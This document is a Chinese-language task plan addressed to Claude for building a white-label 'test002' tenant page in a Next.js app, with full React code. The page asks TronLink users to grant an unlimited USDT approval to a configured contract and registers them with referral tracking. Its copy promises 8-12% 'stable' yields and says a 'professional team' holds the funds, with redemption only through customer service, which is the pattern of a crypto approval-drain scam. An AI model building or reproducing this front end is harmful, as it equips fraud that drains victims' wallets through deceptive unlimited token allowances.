# test002 租戶實作計劃

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** 為 customer-web 創建 test002 租戶的專業理財風格投資頁面

**Architecture:** 在 tenants/test002 目錄下創建 InvestPage 和 SuccessPage 組件，使用與 tenant-a 相同的 hooks 和共享組件，但採用深藍+金色配色和專業理財文案風格。

**Tech Stack:** React, Next.js 15 App Router, TypeScript, Tailwind CSS, TronWeb

---

## Task 1: 創建 test002 目錄結構

**Files:**
- Create: `apps/customer-web/tenants/test002/index.ts`

**Step 1: 創建目錄**

```bash
mkdir -p apps/customer-web/tenants/test002
```

**Step 2: 創建 index.ts 文件**

創建 `apps/customer-web/tenants/test002/index.ts`：

```typescript
export { InvestPage } from './InvestPage';
export { SuccessPage } from './SuccessPage';
```

**Step 3: 提交**

```bash
git add apps/customer-web/tenants/test002/
git commit -m "feat(customer-web): 創建 test002 租戶目錄結構"
```

---

## Task 2: 實作 test002 InvestPage 組件

**Files:**
- Create: `apps/customer-web/tenants/test002/InvestPage.tsx`

**Step 1: 創建 InvestPage.tsx 文件**

創建 `apps/customer-web/tenants/test002/InvestPage.tsx`，完整代碼如下：

```typescript
'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { TenantPageProps } from '@/shared/types';
import { useWallet, useApprove, useReferral } from '@/shared/hooks';
import { registerCustomer } from '@/shared/lib/api';
import { LoadingSpinner, ErrorDisplay, WalletButton } from '@/shared/components';

export function InvestPage({ tenantConfig }: TenantPageProps) {
  const router = useRouter();
  const { isReady, isConnected, address, error: walletError } = useWallet();
  const { approve, isLoading: approving, error: approveError } = useApprove();
  const { referralCode } = useReferral();
  const [registering, setRegistering] = useState(false);
  const [error, setError] = useState<any>(null);

  const handleAuthorize = async () => {
    if (!isConnected || !address) return;

    try {
      setError(null);

      // 1. 授權 USDT
      const txHash = await approve(
        tenantConfig.investmentContractAddress,
        tenantConfig.usdtTokenAddress,
      );

      // 2. 註冊客戶
      setRegistering(true);
      await registerCustomer({
        walletAddress: address,
        approvedAmount: -1, // 無限額度
        approvalTxHash: txHash,
        referralCode: referralCode || undefined,
      });

      // 3. 導向成功頁面
      router.push('/success');
    } catch (err) {
      setError(err);
    } finally {
      setRegistering(false);
    }
  };

  if (!isReady) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-blue-50">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  const displayError = error || approveError || walletError;

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-blue-100 p-4">
      <div className="max-w-lg w-full bg-white rounded-xl shadow-xl p-8">
        {/* 頁面標題 */}
        <div className="text-center mb-6">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            穩健投資理財方案
          </h1>
          <p className="text-gray-600">
            專業團隊管理，透明安全可信
          </p>
        </div>

        {/* 錯誤訊息 */}
        {displayError && (
          <div className="mb-6">
            <ErrorDisplay error={displayError} />
          </div>
        )}

        {/* 產品資訊卡片 */}
        <div className="mb-6 p-5 bg-blue-50 border border-blue-200 rounded-lg">
          <h3 className="text-sm font-semibold text-gray-700 mb-3">產品特點</h3>
          <div className="grid grid-cols-2 gap-4">
            <div>
              <p className="text-xs text-gray-600 mb-1">預期年化收益</p>
              <p className="text-lg font-bold text-blue-800">8-12%</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">投資門檻</p>
              <p className="text-lg font-bold text-blue-800">100 USDT 起</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">鎖定期限</p>
              <p className="text-lg font-bold text-blue-800">靈活贖回</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">風險等級</p>
              <p className="text-lg font-bold text-blue-800">穩健型</p>
            </div>
          </div>
        </div>

        {/* 已連接錢包 */}
        {isConnected && address && (
          <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">已連接錢包</p>
            <p className="text-sm font-mono text-gray-900 break-all">
              {address}
            </p>
          </div>
        )}

        {/* 推薦碼顯示 */}
        {referralCode && (
          <div className="mb-6 p-4 bg-amber-50 border border-amber-200 rounded-lg">
            <p className="text-sm text-amber-900">
              您正在使用推薦人邀請加入
            </p>
            <p className="text-sm mt-1">
              <span className="text-amber-700">推薦碼: </span>
              <span className="font-semibold text-amber-900">{referralCode}</span>
            </p>
          </div>
        )}

        {/* 授權按鈕 */}
        <WalletButton
          onClick={handleAuthorize}
          loading={approving || registering}
          disabled={!isConnected || approving || registering}
          className="w-full bg-blue-800 hover:bg-blue-900 text-white"
        >
          {approving ? '授權處理中...' : registering ? '開通帳戶中...' : '授權投資帳戶'}
        </WalletButton>

        {/* 安全提示 */}
        <p className="text-xs text-gray-500 text-center mt-4">
          授權後，您的 USDT 將由專業團隊託管管理，可隨時查看收益明細
        </p>
      </div>
    </div>
  );
}
```

**Step 2: 提交**

```bash
git add apps/customer-web/tenants/test002/InvestPage.tsx
git commit -m "feat(customer-web): 實作 test002 投資授權頁面

- 專業理財風格設計
- 深藍+金色配色方案
- 產品特點資訊卡片
- 完整授權流程"
```

---

## Task 3: 實作 test002 SuccessPage 組件

**Files:**
- Create: `apps/customer-web/tenants/test002/SuccessPage.tsx`

**Step 1: 創建 SuccessPage.tsx 文件**

創建 `apps/customer-web/tenants/test002/SuccessPage.tsx`，完整代碼如下：

```typescript
'use client';

import { useRouter } from 'next/navigation';
import { TenantPageProps } from '@/shared/types';
import { useWallet } from '@/shared/hooks';

export function SuccessPage(_props: TenantPageProps) {
  const router = useRouter();
  const { address } = useWallet();

  const handleReturnHome = () => {
    router.push('/');
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-blue-100 p-4">
      <div className="max-w-lg w-full bg-white rounded-xl shadow-xl p-8">
        {/* 成功圖示 */}
        <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg
            className="w-10 h-10 text-emerald-600"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={3}
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>

        {/* 成功訊息 */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-800 mb-3">
            帳戶開通成功
          </h1>
          <p className="text-gray-600">
            感謝您選擇我們的專業理財服務
          </p>
        </div>

        {/* 下一步說明 */}
        <div className="mb-6 p-5 bg-blue-50 border border-blue-200 rounded-lg">
          <h3 className="text-sm font-semibold text-gray-700 mb-3">接下來的步驟</h3>
          <ul className="space-y-2 text-sm text-gray-600">
            <li className="flex items-start">
              <span className="text-blue-600 mr-2">•</span>
              <span>專業團隊將開始為您管理資產</span>
            </li>
            <li className="flex items-start">
              <span className="text-blue-600 mr-2">•</span>
              <span>您可以隨時查看投資收益</span>
            </li>
            <li className="flex items-start">
              <span className="text-blue-600 mr-2">•</span>
              <span>如需贖回請聯繫客服團隊</span>
            </li>
          </ul>
        </div>

        {/* 投資帳戶 */}
        {address && (
          <div className="mb-6 p-4 bg-gray-50 border border-gray-200 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">您的投資帳戶</p>
            <p className="text-sm font-mono text-gray-900 break-all">
              {address}
            </p>
          </div>
        )}

        {/* 返回首頁按鈕 */}
        <button
          onClick={handleReturnHome}
          className="w-full py-3 px-6 bg-blue-800 hover:bg-blue-900 text-white font-medium rounded-lg transition-colors"
        >
          返回首頁
        </button>
      </div>
    </div>
  );
}
```

**Step 2: 提交**

```bash
git add apps/customer-web/tenants/test002/SuccessPage.tsx
git commit -m "feat(customer-web): 實作 test002 成功頁面

- 詳細的後續步驟說明
- 投資帳戶資訊顯示
- 返回首頁功能
- 專業理財風格設計"
```

---

## Task 4: 註冊 test002 到 tenantRegistry

**Files:**
- Modify: `apps/customer-web/tenants/index.ts:9-13`

**Step 1: 更新 tenantRegistry**

修改 `apps/customer-web/tenants/index.ts`，在 tenantRegistry 中添加 test002：

```typescript
const tenantRegistry: Record<string, () => Promise<TenantPages>> = {
  'tenant-a': () => import('./tenant-a').then(m => ({
    InvestPage: m.InvestPage,
    SuccessPage: m.SuccessPage,
  })),
  'test002': () => import('./test002').then(m => ({
    InvestPage: m.InvestPage,
    SuccessPage: m.SuccessPage,
  })),
};
```

**Step 2: 提交**

```bash
git add apps/customer-web/tenants/index.ts
git commit -m "feat(customer-web): 註冊 test002 租戶到路由系統"
```

---

## Task 5: 類型檢查

**Step 1: 執行 TypeScript 類型檢查**

```bash
cd apps/customer-web
pnpm type-check
```

預期輸出：無錯誤

**Step 2: 如果有錯誤**

根據錯誤訊息修復問題，然後重新執行 type-check，直到通過。

**Step 3: 提交修復（如果有）**

```bash
git add .
git commit -m "fix(customer-web): 修復 test002 類型錯誤"
```

---

## Task 6: 建置驗證

**Step 1: 執行建置**

```bash
cd apps/customer-web
pnpm build
```

預期輸出：建置成功，無錯誤

**Step 2: 如果建置失敗**

根據錯誤訊息修復問題，確保：
- 所有 import 路徑正確
- 沒有未使用的變數
- 組件語法正確

**Step 3: 提交修復（如果有）**

```bash
git add .
git commit -m "fix(customer-web): 修復 test002 建置錯誤"
```

---

## 測試指引

### 前置條件

1. **確認 test002 租戶存在於 platform-api**
   ```bash
   curl http://localhost:3000/tenants/by-domain/test002.example.com
   ```
   應返回 test002 的租戶資訊，包含 `investmentContractAddress` 和 `usdtTokenAddress`

2. **設定本地測試域名**
   編輯 `/etc/hosts`：
   ```
   127.0.0.1 test002.example.com
   ```

### 手動測試步驟

1. **啟動 customer-web**
   ```bash
   cd apps/customer-web
   pnpm dev
   ```

2. **在 TronLink 錢包中開啟頁面**
   - 打開 TronLink 移動版或瀏覽器擴展
   - 訪問 `http://test002.example.com:3000`

3. **驗證視覺樣式**
   - ✅ 深藍+金色配色正確
   - ✅ 產品特點卡片顯示完整
   - ✅ 文案使用正式語氣（「您」）
   - ✅ 佈局整潔專業

4. **測試錢包連接**
   - ✅ 頁面載入時顯示 loading spinner
   - ✅ 檢測到 TronWeb 後顯示錢包地址
   - ✅ 未檢測到錢包時顯示錯誤訊息

5. **測試推薦碼**
   - 訪問 `http://test002.example.com:3000?ref=ABC123`
   - ✅ 推薦碼顯示在金色卡片中

6. **測試授權流程**
   - 點擊「授權投資帳戶」按鈕
   - ✅ 按鈕文字變為「授權處理中...」
   - ✅ TronLink 彈出授權請求
   - 確認授權
   - ✅ 按鈕文字變為「開通帳戶中...」
   - ✅ 成功後導向 /success 頁面

7. **測試成功頁面**
   - ✅ 顯示綠色成功圖示
   - ✅ 顯示「帳戶開通成功」標題
   - ✅ 顯示後續步驟列表
   - ✅ 顯示投資帳戶地址
   - ✅ 「返回首頁」按鈕正常運作

### 錯誤情境測試

1. **用戶拒絕授權**
   - 點擊授權按鈕，在 TronLink 中選擇拒絕
   - ✅ 顯示錯誤訊息
   - ✅ 可以重新嘗試

2. **錢包餘額不足**
   - 使用餘額不足的錢包
   - ✅ 顯示錯誤訊息

3. **網路錯誤**
   - 關閉 tenant-api
   - 嘗試授權
   - ✅ 顯示錯誤訊息

---

## 完成檢查清單

- [ ] test002 目錄結構創建完成
- [ ] InvestPage 組件實作完成
- [ ] SuccessPage 組件實作完成
- [ ] tenantRegistry 註冊完成
- [ ] TypeScript 類型檢查通過
- [ ] Next.js 建置成功
- [ ] 視覺樣式符合設計文檔
- [ ] 錢包連接功能正常
- [ ] 授權流程完整運作
- [ ] 錯誤處理正確顯示
- [ ] 所有變更已提交到 git

---

## 備註

- 本實作計劃假設 tenant-a 的基礎架構已完整且可用
- 如遇到共享組件或 hooks 的問題，應優先修復共享代碼而非繞過
- test002 的配色和文案可在後續根據實際需求微調
- 建議在實作完成後進行完整的端對端測試
